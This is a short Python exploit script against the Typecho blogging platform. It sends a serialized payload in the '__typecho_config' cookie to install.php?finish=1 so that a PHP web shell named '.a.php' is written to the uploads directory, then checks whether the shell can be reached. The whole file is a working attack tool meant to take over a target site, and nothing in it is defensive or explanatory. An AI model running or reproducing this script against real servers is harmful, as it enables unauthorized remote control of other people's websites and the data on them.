import requests
from urllib import quote
import os
import sys

if __name__ == '__main__':
    targert_url = sys.argv[1];
    shell_hash = sys.argv[2];
    shell_name = '.a.php'

    content =  open('./not_use/1.php').read().replace('shell_hash',shell_hash)
    open('./not_use/tmp.php','w').write(content)

    rsp = requests.get(targert_url + "/install.php");
    if rsp.status_code != 200:
        print('The attack failed and the problem file does not exist !!!')
    else:
        print 'You are lucky, the problem file exists, immediately attack !!!'
        typecho_config = os.popen('php ./not_use/tmp.php').read()
        headers = {'Host':'honk','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64;rv:56.0) Gecko/20100101 Firefox/56.0','Cookie': 'antispame=1508415662;antispamkey=cc7dffeba8d48da508df125b5a50edbd;PHPSESSID=po1hggbeslfoglbvurjjt2lcg0;__typecho_lang=zh_CN;__typecho_config={typecho_config};'.format(typecho_config=quote(typecho_config)),'Referer': targert_url}
        url = targert_url + "/install.php?finish=1"
        requests.get(url,headers=headers,allow_redirects=False)
        shell_url = targert_url + '/usr/uploads/' + shell_name
    if requests.get(shell_url).status_code == 200:
        print 'shell_url: ' + shell_url
    else:
        print "Getshell Fail!"
